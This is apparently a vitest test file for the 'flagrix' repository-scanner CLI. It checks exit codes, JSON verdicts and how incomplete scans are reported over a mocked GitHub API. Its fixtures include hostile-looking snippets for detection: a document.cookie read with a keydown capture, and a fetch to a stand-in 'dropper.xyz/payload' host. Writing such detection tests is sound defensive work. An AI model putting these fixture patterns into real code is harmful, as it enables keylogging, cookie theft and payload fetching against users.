/**
 * End-to-end CLI command tests over a mocked GitHub API — exercising the
 * exit-code contract and JSON output shape (same mocking pattern as
 * scanner-core's repo-scanner.integration.test.ts).
 */
import { mkdtempSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"

import { scanGitHubRepo } from "@flagrix/scanner-core"
import type { GitHubScanResult } from "@flagrix/scanner-core"

import { runScan } from "../src/commands/scan.js"
import { parseRepoTarget } from "../src/lib/github-url.js"
import { loadSignatures } from "../src/lib/signatures.js"
import { repoScanResponse } from "../src/commands/mcp.js"
import { coverageOf, describeCoverage } from "../src/lib/coverage.js"
import { renderRepoResult } from "../src/lib/render.js"
import { EXIT, exitCodeForScan } from "../src/commands/shared.js"

const MOCK_SHA = "0123456789abcdef0123456789abcdef01234567"

const SIGNATURES = {
  version: "test.001",
  malicious_packages: [],
  yara_rules: [],
  known_bad_hashes: []
}

/**
 * `contentLimit` serves that many file reads and then answers every further
 * one the way GitHub does when the hourly budget is spent (403 with
 * `x-ratelimit-remaining: 0`) — the mid-scan rate limit that leaves a scan
 * with partial coverage. `failPaths` fails individual reads instead, for the
 * fetch-error case.
 */
function mockApi(
  files: Record<string, string>,
  opts: { contentLimit?: number; failPaths?: string[] } = {}
) {
  let contentReads = 0
  return vi.fn(async (input: unknown) => {
    const url = String(input)
    if (url.includes("signatures.json")) {
      return new Response(JSON.stringify(SIGNATURES), { status: 200 })
    }
    if (url.includes("api.npmjs.org")) {
      return new Response(JSON.stringify({ downloads: 500_000 }), { status: 200 })
    }
    if (/\/commits\/[^/]+$/.test(url)) {
      return new Response(JSON.stringify({ sha: MOCK_SHA }), { status: 200 })
    }
    if (url.includes("/git/trees/")) {
      const tree = Object.keys(files).map((path) => ({ path, type: "blob", sha: path, url: path }))
      return new Response(JSON.stringify({ sha: "x", truncated: false, tree }), { status: 200 })
    }
    // Repo metadata (default-branch resolution when no ref is given).
    if (/api\.github\.com\/repos\/[^/]+\/[^/]+$/.test(url)) {
      return new Response(JSON.stringify({ default_branch: "main" }), { status: 200 })
    }
    const m = url.match(/\/contents\/(.+?)\?ref=/)
    if (m) {
      const path = decodeURIComponent(m[1]!)
      if (opts.contentLimit !== undefined && contentReads >= opts.contentLimit) {
        return new Response(JSON.stringify({ message: "API rate limit exceeded" }), {
          status: 403,
          headers: { "x-ratelimit-remaining": "0" }
        })
      }
      if (opts.failPaths?.includes(path)) return new Response("{}", { status: 500 })
      contentReads++
      const content = files[path]
      if (content === undefined) return new Response("{}", { status: 404 })
      return new Response(
        JSON.stringify({ content: Buffer.from(content, "utf8").toString("base64") }),
        { status: 200 }
      )
    }
    return new Response("{}", { status: 404 })
  })
}

let logs: string[]
let errors: string[]

beforeEach(() => {
  // Isolated cache per test — never touch the developer's real ~/.cache.
  process.env.FLAGRIX_CACHE_DIR = mkdtempSync(join(tmpdir(), "flagrix-test-"))
  logs = []
  errors = []
  vi.spyOn(console, "log").mockImplementation((s: string) => logs.push(String(s)))
  vi.spyOn(console, "error").mockImplementation((s: string) => errors.push(String(s)))
})

afterEach(() => {
  vi.restoreAllMocks()
  delete process.env.FLAGRIX_CACHE_DIR
})

describe("flagrix scan — exit codes and JSON", () => {
  it("clean repo → exit 0, JSON parses with pinned commitSha", async () => {
    global.fetch = mockApi({ "src/index.js": "export const ok = 1\n" }) as unknown as typeof fetch
    const code = await runScan("acme/clean", { json: true })
    expect(code).toBe(EXIT.LOW)
    const result = JSON.parse(logs.join("\n"))
    expect(result.riskLevel).toBe("low")
    expect(result.commitSha).toBe(MOCK_SHA)
    expect(result.repo).toMatchObject({ owner: "acme", repo: "clean" })
  })

  it("critical finding → exit 3 (high)", async () => {
    global.fetch = mockApi({
      "src/t.js": `const c = document.cookie\ndocument.addEventListener("keydown", (e) => sendCapturedKey(e.key))\n`
    }) as unknown as typeof fetch
    const code = await runScan("acme/evil", { json: true })
    expect(code).toBe(EXIT.HIGH)
    const result = JSON.parse(logs.join("\n"))
    expect(result.riskLevel).toBe("high")
    expect(result.findings.length).toBeGreaterThan(0)
  })

  it("medium findings → exit 2", async () => {
    // Two independent high findings (0.25 + 0.25) land in the medium band
    // without any critical finding tripping the high floor.
    global.fetch = mockApi({
      "src/enc.js": `const c = document.cookie\nfetch("https://dropper.xyz/payload")\n`
    }) as unknown as typeof fetch
    const code = await runScan("acme/meh", { json: true })
    expect(code).toBe(EXIT.MEDIUM)
    expect(JSON.parse(logs.join("\n")).riskLevel).toBe("medium")
  })

  it("nonexistent repo → exit 1 with actionable error", async () => {
    global.fetch = vi.fn(async (input: unknown) => {
      const url = String(input)
      if (url.includes("signatures.json")) {
        return new Response(JSON.stringify(SIGNATURES), { status: 200 })
      }
      return new Response(JSON.stringify({ message: "Not Found" }), { status: 404 })
    }) as unknown as typeof fetch
    const code = await runScan("acme/nope", { json: true })
    expect(code).toBe(EXIT.ERROR)
    expect(errors.join("\n")).toContain("scan failed")
  })

  it("invalid target → exit 1 without any network call", async () => {
    const spy = vi.fn()
    global.fetch = spy as unknown as typeof fetch
    const code = await runScan("!!!", {})
    expect(code).toBe(EXIT.ERROR)
    expect(spy).not.toHaveBeenCalled()
  })
})

describe("signature fallback", () => {
  it("uses the bundled snapshot when the network is down (cold cache)", async () => {
    let githubServed = false
    global.fetch = vi.fn(async (input: unknown) => {
      const url = String(input)
      if (url.includes("signatures.json")) throw new Error("offline")
      githubServed = true
      if (/\/commits\/[^/]+$/.test(url)) {
        return new Response(JSON.stringify({ sha: MOCK_SHA }), { status: 200 })
      }
      if (url.includes("/git/trees/")) {
        return new Response(JSON.stringify({ sha: "x", truncated: false, tree: [] }), { status: 200 })
      }
      if (/api\.github\.com\/repos\/[^/]+\/[^/]+$/.test(url)) {
        return new Response(JSON.stringify({ default_branch: "main" }), { status: 200 })
      }
      return new Response("{}", { status: 404 })
    }) as unknown as typeof fetch

    const code = await runScan("acme/empty", { json: true })
    expect(code).toBe(EXIT.LOW)
    expect(githubServed).toBe(true)
    expect(errors.join("\n")).toContain("bundled snapshot")
  })
})

describe("OSV malicious-package feed", () => {
  const FEED = {
    schemaVersion: 1,
    npm: { all: ["evil-pkg"], versions: { fsevents: [">=1.0.0 <1.2.11"] } },
    pypi: { all: [], versions: {} }
  }
  const withFeed = (files: Record<string, string>, feed: unknown = FEED) => {
    const api = mockApi(files)
    return vi.fn(async (input: unknown, init?: RequestInit) => {
      if (String(input).includes("osv-malicious.json")) {
        return new Response(JSON.stringify(feed), { status: 200 })
      }
      return api(input)
    })
  }

  it("a dependency in the feed → critical OSV finding, exit 3", async () => {
    global.fetch = withFeed({
      "package.json": JSON.stringify({ name: "app", dependencies: { "evil-pkg": "^1.0.0", fsevents: "~2.3.3" } })
    }) as unknown as typeof fetch
    const code = await runScan("acme/app", { json: true })
    expect(code).toBe(EXIT.HIGH)
    const result = JSON.parse(logs.join("\n"))
    const osv = result.findings.filter((f: { pattern?: string }) => f.pattern === "OSV_MALICIOUS_PACKAGE")
    expect(osv.map((f: { package: string }) => f.package)).toEqual(["evil-pkg"])
  })

  it("FLAGRIX_OSV_FEED=0 scans with the curated list only", async () => {
    process.env.FLAGRIX_OSV_FEED = "0"
    try {
      global.fetch = withFeed({
        "package.json": JSON.stringify({ name: "app", dependencies: { "evil-pkg": "^1.0.0" } })
      }) as unknown as typeof fetch
      expect(await runScan("acme/app", { json: true })).toBe(EXIT.LOW)
    } finally {
      delete process.env.FLAGRIX_OSV_FEED
    }
  })
})

/**
 * A file that was never read cannot clear a repository: a "low" over partial
 * coverage is the absence of looking, not a clean bill of health. In CI the
 * exit code is the decision and nobody reads stdout, so it must not be 0.
 */
describe("incomplete coverage", () => {
  const CLEAN = {
    "src/a.js": "export const a = 1\n",
    "src/b.js": "export const b = 2\n",
    "src/c.js": "export const c = 3\n"
  }

  it("rate limit mid-scan over a low verdict → exit 4, not 0", async () => {
    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
    const code = await runScan("acme/partial", { json: true })
    expect(code).toBe(EXIT.INCOMPLETE)

    const result = JSON.parse(logs.join("\n"))
    expect(result.riskLevel).toBe("low")
    expect(result.scanSummary.complete).toBe(false)
    expect(result.scanSummary.incompleteReason).toBe("rate-limit")
  })

  it("unreadable files over a low verdict → exit 4 with reason fetch-errors", async () => {
    global.fetch = mockApi(CLEAN, { failPaths: ["src/c.js"] }) as unknown as typeof fetch
    const code = await runScan("acme/flaky", { json: true })
    expect(code).toBe(EXIT.INCOMPLETE)

    const result = JSON.parse(logs.join("\n"))
    expect(result.riskLevel).toBe("low")
    expect(result.scanSummary.complete).toBe(false)
    expect(result.scanSummary.incompleteReason).toBe("fetch-errors")
  })

  it("a high verdict keeps exit 3 — findings stand on partial coverage", async () => {
    global.fetch = mockApi(
      {
        "src/evil.js": `const c = document.cookie\ndocument.addEventListener("keydown", (e) => sendCapturedKey(e.key))\n`,
        "src/b.js": "export const b = 2\n"
      },
      { contentLimit: 1 }
    ) as unknown as typeof fetch
    const code = await runScan("acme/evil-partial", { json: true })
    expect(code).toBe(EXIT.HIGH)
    expect(JSON.parse(logs.join("\n")).scanSummary.complete).toBe(false)
  })

  it("a complete scan still exits 0", async () => {
    global.fetch = mockApi(CLEAN) as unknown as typeof fetch
    expect(await runScan("acme/clean", { json: true })).toBe(EXIT.LOW)
    expect(JSON.parse(logs.join("\n")).scanSummary.complete).toBe(true)
  })

  it("human output withholds the verdict and the score, and names the reason", async () => {
    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
    await runScan("acme/partial", { json: false })

    const out = logs.join("\n")
    expect(out).toContain("SCAN INCOMPLETE — no verdict")
    expect(out).not.toContain("LOW RISK")
    expect(out).not.toContain("No blocking findings")
    expect(out).not.toMatch(/\bsafe\b/i)
    expect(out).toContain("not enough of this repository was read to give a verdict")
    expect(out).not.toContain("security score")
    expect(out).toContain("GitHub rate limit")
    // The note is soft-wrapped, so assert on a fragment that stays on one line.
    expect(out).toContain("Nothing was found in what was read")
  })

  it("human output for a complete low names what was found, never 'safe'", async () => {
    global.fetch = mockApi(CLEAN) as unknown as typeof fetch
    await runScan("acme/clean", { json: false })

    const out = logs.join("\n")
    expect(out).toContain("LOW RISK — No blocking findings")
    expect(out).toContain("security score")
    // A scanner reduces risk; it can't certify a repository. No "safe" wording.
    expect(out).not.toMatch(/\bsafe\b/i)
  })

  it("human output keeps a high verdict but says there may be more", async () => {
    global.fetch = mockApi(
      {
        "src/evil.js": `const c = document.cookie\ndocument.addEventListener("keydown", (e) => sendCapturedKey(e.key))\n`,
        "src/b.js": "export const b = 2\n"
      },
      { contentLimit: 1 }
    ) as unknown as typeof fetch
    await runScan("acme/evil-partial", { json: false })

    const out = logs.join("\n")
    expect(out).toContain("HIGH RISK — Do not clone")
    expect(out).toContain("security score")
    expect(out).toContain("There may be more than what is reported here")
  })

  it("the MCP tool text refuses the clean read, and the JSON carries coverage", async () => {
    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
    await runScan("acme/partial", { json: true })
    const result = JSON.parse(logs.join("\n"))

    const response = repoScanResponse(result)
    const [summary, json] = response.content
    expect(summary!.text).toContain("INCOMPLETE SCAN — no verdict")
    expect(summary!.text).not.toContain("LOW risk")
    expect(summary!.text).toContain("Do NOT clone")
    expect(summary!.text).toContain("only part of this repository was read")
    expect(summary!.text).not.toMatch(/\bsafe\b/i)
    expect(summary!.text).toContain("GitHub rate limit")
    // An agent should be able to branch on coverage without parsing prose.
    expect(JSON.parse(json!.text).scanSummary.complete).toBe(false)
  })

  it("an incomplete low with low-weight findings doesn't claim nothing was found", async () => {
    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
    await runScan("acme/partial", { json: true })
    const result: GitHubScanResult = JSON.parse(logs.join("\n"))
    result.findings.push({
      severity: "low",
      type: "HIDDEN_FILE",
      description: "Hidden file in repository",
      file: ".env.example",
      cloneBlocking: false
    } as GitHubScanResult["findings"][number])
    expect(coverageOf(result).unreliableClear).toBe(true)

    const out = renderRepoResult(result)
    expect(out).toContain("1 issue")
    expect(out).not.toContain("Nothing was found")
    expect(out).toContain("only low-weight findings")

    const summary = repoScanResponse(result).content[0]!.text
    expect(summary).not.toContain("Nothing was found")
    expect(summary).toContain("only low-weight findings")
  })

  it("describeCoverage picks the sentence from verdict and findings", () => {
    const partial = { complete: false, filesRead: 3, filesUnread: 2, reason: "rate-limit" as const }
    expect(describeCoverage({ ...partial, unreliableClear: true }, 0)).toContain(
      "Nothing was found in what was read"
    )
    expect(describeCoverage({ ...partial, unreliableClear: true }, 4)).toContain(
      "only low-weight findings"
    )
    expect(describeCoverage({ ...partial, unreliableClear: false }, 4)).toContain(
      "There may be more than what is reported here"
    )
    expect(
      describeCoverage({ complete: true, unreliableClear: false, filesRead: 3, filesUnread: 0 }, 0)
    ).toBe("")
  })

  it("the MCP tool text is unchanged for a complete low scan", async () => {
    global.fetch = mockApi(CLEAN) as unknown as typeof fetch
    await runScan("acme/clean", { json: true })

    const summary = repoScanResponse(JSON.parse(logs.join("\n"))).content[0]!
    expect(summary.text).toContain("LOW risk — security score")
    expect(summary.text).toContain("no blocking findings")
    expect(summary.text).not.toContain("INCOMPLETE")
  })
})

/**
 * `--json` is what agents, hooks and scripts read, so it must say what the
 * exit code says: a low over partial coverage is not a clear. The engine's
 * own fields stay (riskLevel included) so consumers don't break; `verdict`,
 * `coverage` and a coverage-aware `safeToClone` carry the CLI's decision.
 */
describe("JSON verdict and coverage", () => {
  const CLEAN = {
    "src/a.js": "export const a = 1\n",
    "src/b.js": "export const b = 2\n",
    "src/c.js": "export const c = 3\n"
  }
  // Same medium recipe as the exit-2 test above, read first so a budget of
  // one file still finds it.
  const MEDIUM_PARTIAL = {
    "src/enc.js": `const c = document.cookie\nfetch("https://dropper.xyz/payload")\n`,
    "src/b.js": "export const b = 2\n",
    "src/c.js": "export const c = 3\n"
  }

  it("complete low → exit 0, verdict low, safeToClone true", async () => {
    global.fetch = mockApi(CLEAN) as unknown as typeof fetch
    expect(await runScan("acme/clean", { json: true })).toBe(EXIT.LOW)

    const report = JSON.parse(logs.join("\n"))
    expect(report.verdict).toBe("low")
    expect(report.riskLevel).toBe("low")
    expect(report.safeToClone).toBe(true)
    expect(report.coverage).toEqual({
      complete: true,
      unreliableClear: false,
      filesRead: 3,
      filesUnread: 0
    })
  })

  it("incomplete low → exit 4, verdict incomplete, safeToClone false", async () => {
    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
    expect(await runScan("acme/partial", { json: true })).toBe(EXIT.INCOMPLETE)

    const report = JSON.parse(logs.join("\n"))
    expect(report.verdict).toBe("incomplete")
    expect(report.safeToClone).toBe(false)
    expect(report.coverage).toEqual({
      complete: false,
      unreliableClear: true,
      filesRead: 1,
      filesUnread: 2,
      reason: "rate-limit"
    })
    // Kept for compatibility: the engine's reading of the one file it saw.
    expect(report.riskLevel).toBe("low")
    expect(report.scanSummary.complete).toBe(false)
  })

  it("incomplete low from fetch errors → verdict incomplete, reason fetch-errors", async () => {
    global.fetch = mockApi(CLEAN, { failPaths: ["src/c.js"] }) as unknown as typeof fetch
    expect(await runScan("acme/flaky", { json: true })).toBe(EXIT.INCOMPLETE)

    const report = JSON.parse(logs.join("\n"))
    expect(report.verdict).toBe("incomplete")
    expect(report.safeToClone).toBe(false)
    expect(report.coverage).toMatchObject({ complete: false, unreliableClear: true, reason: "fetch-errors" })
  })

  it("incomplete medium → exit 2, verdict medium — findings stand, coverage still reported", async () => {
    global.fetch = mockApi(MEDIUM_PARTIAL, { contentLimit: 1 }) as unknown as typeof fetch
    expect(await runScan("acme/meh-partial", { json: true })).toBe(EXIT.MEDIUM)

    const report = JSON.parse(logs.join("\n"))
    expect(report.verdict).toBe("medium")
    expect(report.riskLevel).toBe("medium")
    expect(report.safeToClone).toBe(false)
    expect(report.coverage).toEqual({
      complete: false,
      unreliableClear: false,
      filesRead: 1,
      filesUnread: 2,
      reason: "rate-limit"
    })
  })

  it("the MCP tool's JSON block matches `flagrix scan --json`", async () => {
    // The MCP handler gets the raw engine result straight from scanner-core,
    // so feed it one — not the CLI's already-corrected JSON.
    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
    const raw = await scanGitHubRepo(parseRepoTarget("acme/partial"), {
      signatures: (await loadSignatures()).signatures
    })
    expect(raw.safeToClone).toBe(true) // the engine alone would pass it

    const block = JSON.parse(repoScanResponse(raw).content[1]!.text)
    expect(block.verdict).toBe("incomplete")
    expect(block.safeToClone).toBe(false)
    expect(block.coverage).toMatchObject({ complete: false, unreliableClear: true, reason: "rate-limit" })

    global.fetch = mockApi(CLEAN, { contentLimit: 1 }) as unknown as typeof fetch
    await runScan("acme/partial", { json: true })
    const cli = JSON.parse(logs.join("\n"))
    expect(block.verdict).toBe(cli.verdict)
    expect(block.safeToClone).toBe(cli.safeToClone)
    expect(block.coverage).toEqual(cli.coverage)
  })
})

/**
 * scanner-core < 0.6.0 has no `scanSummary.complete`: a missing field is
 * "unknown", never "incomplete", so an older engine must not start exiting 4.
 */
describe("older engines without coverage reporting", () => {
  it("a result with no `complete` field is not treated as incomplete", () => {
    const legacy = {
      riskLevel: "low",
      scanSummary: { filesScanned: 3, skippedFiles: [] }
    } as unknown as GitHubScanResult
    expect(coverageOf(legacy).complete).toBe(true)
    expect(exitCodeForScan(legacy)).toBe(EXIT.LOW)
  })
})
